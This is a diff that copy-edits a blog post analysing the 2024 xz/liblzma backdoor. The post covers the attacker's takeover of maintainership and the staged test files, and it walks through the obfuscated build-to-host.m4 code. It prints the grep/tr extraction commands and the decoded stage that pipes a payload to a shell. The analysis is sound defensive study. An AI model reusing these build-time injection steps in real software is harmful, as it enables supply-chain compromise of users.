@@ -8,30 +8,30 @@ author_image: https://avatars.githubusercontent.com/dominusmars
 image: /img/xz_backdoor.png
 ---
 
-Openssh is a program installed automatically on a bunch of linux distros. It provides users with a way to access and control a target computer from any where using their username and password and SSH(Secure Shell) connection back to the user. OpenSSH depends on certain libraries to function. One of these libraries xz included a backdoor which overwrote its authentication process allowing the attacker in.
+OpenSSH is a program that is installed automatically on a bunch of Linux distros. It allows users to access and control a target computer from anywhere using their username and password and SSH(Secure Shell) connection back to the user. OpenSSH depends on specific libraries to function. One of these libraries, XZ, included a backdoor that overwrote its authentication process, allowing the attacker to enter.
 
-xz is a compression utility similar to gunzip which allows developers to compress there files into .xz extensions. Making them easier to transport.
+Xz is a compression utility similar to Gunzip, which allows developers to compress their files into .xz extensions—making them easier to transport. The utility was organically maintained by Lasse Collin around 2009. Many repos, such as OpenSSH, utilize it to compress data.
 
-## How this happened?
+## How did this happen?
 
-The attacker targeted the build process of the xz disguising the malicious code in the build process of liblzma. First, by adding some staging code into the test directory of the github repo. These stages while not at first malicious, ended up having a big effect when the code to launch the payload ended up in the tarball.
+The attacker targeted the XZ build process, disguising the malicious code in the build process of liblzma, first by adding some staging code into the test directory of the GitHub repo. While not initially malicious, these stages had a significant effect when the code to launch the payload ended up in the tarball.
 
-The first commit happened Fri Feb 23 23:09:59 2024, where a two file were added as _/tests/files/bad-3-corrupt_lzma2.xz/_ and _tests/files/good-large_compressed.lzma_. This commit was labeled as just added a few test files to the directory. Another commit happened at Sat Mar 9 10:18:29 202 modifying the compressed code.
+The first commit happened Friday, Feb 23 at 23:09, where two files were added as _/tests/files/bad-3-corrupt_lzma2.xz/_ and _tests/files/good-large_compressed.lzma_. This commit was labeled "just adding a few test files" to the directory. Another commit happened on Saturday, Mar 9, at 10:18, where the compressed code was modified.
 
-The attacker then released a tarball which included a prebuilt step. This step extracted the test files and used them to modify existing functions in the liblzma code. Affectively linking real functions to the one injected by them.
+The attacker then released a tarball, which included a prebuilt step. This step extracted the test files and used them to modify the linkers in the liblzma code. They were effectively linking real functions to the ones they injected.
 
-Befoer the attacker was a maintainer themselves they offered to help the sole maintainer of the repo after they were going through a mental health episode. The attacker also might have used the maintainers mental health against him to take over by commenting under the mailing list. Trying to get the original maintainer to quit there position. This ended up with the attacker becoming a co-maintainer on the repo.
+Before the attacker was a maintainer themselves, they offered to help the sole maintainer of the repo after they were going through a mental health episode. The attacker also might have used the maintainer's mental health against him to take over by commenting under the mailing list. They were trying to get the original maintainer to quit their position. This ended up with the attacker becoming a co-maintainer on the repo.
 
 ## Analysis
 
-Github had taken down the github repo at this point but I was able to find the xz lib on https://git.tukaani.org/?p=xz.git after downloading it to a vm. I'd had taken some precaution, I snapshot the vm before continuing. The suspecting compressed files are in the test directory of the repo.
+GitHub had taken down the repo, but I found the xz lib on https://git.tukaani.org/?p=xz.git after downloading it to a vm. I had taken some precautions, such as taking a snapshot of the VM before continuing. The suspect compressed files are in the test directory of the repo.
 
 ### Step one - The files
 
-After catting the bad-3-corrupt_lzma2.xz file, the resulting bunch of data contained the string Hello World in the middle a little message from the attacker. Then after decompressing the file, the data was malformed meaning just decompressing it will not work.
+After catting the bad-3-corrupt_lzma2.xz file, the resulting bunch of data contained the string Hello World in the middle, a little message from the attacker. Then, after decompressing the file, the data was malformed, meaning decompressing it will not work.
 ![Picture of corrupted data](corrupt_xz.png)
 
-There were three separate headers 7zXZ for inside the file. This file is actually three separate compression streams in one. The first stream is located from 0-72 bytes in and contains
+There were three separate headers, _7zXZ_, inside the file. This file has three separate compression streams. The first stream is located from 0-72 bytes in and contains the following
 
 ```
 ####Hello####
@@ -49,9 +49,9 @@ The last stream was located between 440-512 and was simply
 
 The corruption of the xz stream is a sign of obfuscation and tapering.
 
-The target script was included in a tarball of v5.6.0 and v5.6.1. Under m4 was a script called build-to-host.m4 which isn't included in the git rep. The run build process runs this script. Changing a bunch of bytes inside the code to other bytes using the tr command. As cited here [gynvael](https://gynvael.coldwind.pl/?lang=en&id=782).
+The target script was included in a tarball of v5.6.0 and v5.6.1. Under m4 was a script called build-to-host.m4, which isn't included in the git rep. The run build process runs this script. It changes many bytes inside the code to other bytes using the tr command. As cited here, [gynvael](https://gynvael.coldwind.pl/?lang=en&id=782).
 
-In the build script theres a few variables which get defined the first one being gl_am_configmake this starts the activities.
+In the build script, a few variables get defined, the first being gl_am_configmake, which starts the activities.
 
 ```sh
   gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
@@ -71,7 +71,7 @@ Another variable to be defined is the gl_path_map,
 
 This command translates characters inside a file. This will be used inside the script to change values inside the compressed file.
 
-After filtering through the script the bad code which is left is
+After filtering through the script, the bad code that is left is
 
 ```sh
 gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
@@ -95,11 +95,11 @@ fi
 #AC_SUBST([$1_c_make])
 ```
 
-Running just the transport line returns
+Running just the transform line returns
 
 ```sh
 ####Hello####
-#��Z�.hj�
+#  Z .hj
 eval `grep ^srcdir= config.status`
 if test -f ../../config.status;then
 eval `grep ^srcdir= ../../config.status`
@@ -110,11 +110,11 @@ export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/n
 xz: (stdin): Unexpected end of input
 ```
 
-After unpacking the now uncorrupted bad-3-corrupt_lzma2.xz, we see a unpacker for the good-large_compressed.lzma which manipulate the compressed.lzma file and pipes it to a shell.
+After unpacking the now uncorrupted bad-3-corrupt_lzma2.xz, we see an unpacker for the good-large_compressed.lzma, which manipulates the compressed.lzma file and pipes it to a shell.
 
 ### Step Three - The Script!
 
-After executing this without the /bin/sh we get a script which injects a function is_arch_extension_supported
+After executing this without the /bin/sh, we get a script that injects a function is_arch_extension_supported
 
 The code below is a modified version of the script.
 
@@ -372,19 +372,19 @@ fi
 
 ```
 
-This is a large block of commands so we should break it down, the script starts by initializing some variables. These are strings which will be used later on. It steps up some pic_flags a function name. a get spu id command and the original payload.
+This is a large block of commands, so we should break it down; the script starts by initializing some variables. These are strings that will be used later on. It steps up some pic_flags, a function name. a get cpu id command, and the original payload.
 
-Then, the script runs a bunch of operating system checks ensuring. It checks for a specific function called is_arch_extension_supported, is located in crc64_fast, crc32_fast, and crc_x86_clmul.h.
+Then, the script runs a bunch of operating system checks to ensure that it checks for a specific function called is_arch_extension_supported, which is located in crc64_fast, crc32_fast, and crc_x86_clmul.h.
 
-After, the script checks for the x86_64 architecture if it finds that its running a x86 system it will modify the MakeFile. Adding certain flags and libdeps into the MakeFile of src/liblzma/
+After the script checks for the x86_64 architecture, it will modify the Makefile if it finds that it's running an x86 system. Adding certain flags and libdeps into the MakeFile of src/liblzma/
 
-The script then using the same command as before by bitmapping good-large_compressed.lzma and creates a liblzma_la-crc64-fast.o file which is a ELF file.
+The script then uses the same command as before by bit mapping good-large_compressed.lzma and creates a liblzma_la-crc64-fast.o file, which is an ELF file.
 
-The final thing this script does is modify the crc32_fast.c and crc64_fast.c files and replaces the is_arch_extension_supported() name with \_is_arch_extension_supported(). Interestingly the same person modified the original file removing a space from is_arch_extension_supported.
+The final thing this script does is modify the crc32_fast.c and crc64_fast.c files and replaces the is_arch_extension_supported() name with \_is_arch_extension_supported(). Interestingly, the same person modified the original file, removing a space from is_arch_extension_supported.
 
 ### Step Four - The Binary!
 
-The binary looks to be an ELF file which was not stripped of its function headers. This meant we can look into exactly what the binary is doing
+The binary looks like an ELF file that was not stripped of its function headers. This means we can look into exactly what the binary was doing
 
 ```console
 liblzma_la-crc64-fast.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped
@@ -392,15 +392,13 @@ liblzma_la-crc64-fast.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), n
 
 We can also see here why they were targeting x86-64 in the script above.
 
-Using objdump -x, were able to get the symbol table for the binary and its big. The functions are stated to be lzma functions such as parsing decoding and other useful utilities.
-
-The ELF also exports two functions called \_cpuid and \_get_cpuid, which does get used in the crc_x86_clmul header file.
+Using `objdump -x, we can get the symbol table for the binary and its significance. The functions look like lzma functions, such as parsing, decoding, and other valuable utilities. The ELF also explicitly exports cpuid and get_cpuid, which are used in the crc_x86_clmul header file.
 
 ### Conclusion
 
-This CVE is a story of breaking the trust in our external libaraies. While I think its important to have checks in place to ensure the programs we run are safe. This also demonstraces how a lack of supervision on the libaraies delevlopers use can lead to adverse consequences down the line. Its important for developers of opensource and closed source software to vet the repos they are using. Ensuring that the repos also stay secure as they are being mantained. Many opensource repos are vounteer based this means that effectively anyone can gain the trust of someone maintaining the code and become the maintainer themselves. But, I also think this is what makes the opensource community as a whole very powerful. It was precisely because this was an opensource repo, in which we were able to execute this before it rendered into stable.
+This CVE is a story of breaking the trust in our external libraries. I think it's important to have checks in place to ensure the programs we run are safe. This also demonstrates how a lack of supervision of the library's developers' use can lead to adverse consequences. Developers of open and closed-source software need to vet the repos they use. Ensure that the repos also stay secure as they are being maintained. Many open-source repos are volunteer-based, meaning anyone can effectively gain the trust of someone keeping the code and becoming the maintainer. But I also think this is what makes the open-source community as a whole very powerful. It was precisely because this was an open-source repo that we could detect this before it rendered stable.
 
-One thing that really shocked me when I first got into programming on github was the idea that I could effectively upload anything into releases. If someone depends on my repo's releases or tags. I could in theory upload an entire different program binary and no one would know unless they decompiled the program. While I think the trust that is built by the maintainers throughout the repos life-span does play a role in that not happening. Its still something that could happen. I find myself wishing theres was a way to have github or the repo hoster compile the code instead. That way, there's an assurance that the release is genuinely built from the code in one of the git commits, maintaining the integrity we all count on. But, this sadly also comes with a host of problems itself.
+One thing that shocked me when I first got into programming on GitHub was the idea that I could effectively upload anything into releases. Suppose someone depends on my repo's releases or tags. I could, in theory, upload an entirely different program binary, and no one would know unless they decompiled the program. I think the maintainers' trust throughout the repos lifespan plays a role in more exploits not happening. It's still something that could occur. I wish there were a way to have GitHub or the repo hoster compile the code instead. That way, there's an assurance that the release is genuinely built from the code in one of the git commits, maintaining the integrity we all count on. But, this sadly also comes with a host of problems itself.
 
 ![The Worlds Infrastructure](dependency.png)
 
